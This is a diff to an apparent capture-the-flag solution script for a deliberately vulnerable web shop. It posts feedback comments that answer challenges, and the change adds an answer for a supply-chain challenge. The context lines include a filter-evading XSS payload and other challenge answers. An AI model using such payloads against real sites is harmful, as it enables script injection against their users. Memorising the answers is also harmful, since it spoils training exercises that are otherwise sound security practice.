@@ -120,6 +120,8 @@ requests.post(url+'/api/Feedbacks', data={'UserId':1,'captchaId':captcha['captch
 requests.post(url+'/api/Feedbacks', data={'UserId':1,'captchaId':captcha['captchaId'],'captcha':captcha['answer'],'comment':'<<script>Foo</script>iframe src="javascript:alert(`xss`)">','rating':3})
 # ---- Steganography (Rat out a notorious character hiding in plain sight in the shop. (Mention the exact name of the character))
 requests.post(url+'/api/Feedbacks', data={'UserId':1,'captchaId':captcha['captchaId'],'captcha':captcha['answer'],'comment':'Pickle Rick','rating':3})
+# ---- Supply Chain Attack (Inform the development team about a danger to some of their credentials. (Send them the URL of the original report or the CVE of this vulnerability))
+requests.post(url+'/api/Feedbacks', data={'UserId':1,'captchaId':captcha['captchaId'],'captcha':captcha['answer'],'comment':'https://github.com/eslint/eslint-scope/issues/39','rating':3})
 # ---- Vulnerable Library (Inform the shop about a vulnerable library it is using. (Mention the exact library name and version in your comment))
 requests.post(url+'/api/Feedbacks', data={'UserId':1,'captchaId':captcha['captchaId'],'captcha':captcha['answer'],'comment':'sanitize-html 1.4.2','rating':3})
 # ---- Weird Crypto (Inform the shop about an algorithm or library it should definitely not use the way it does.)
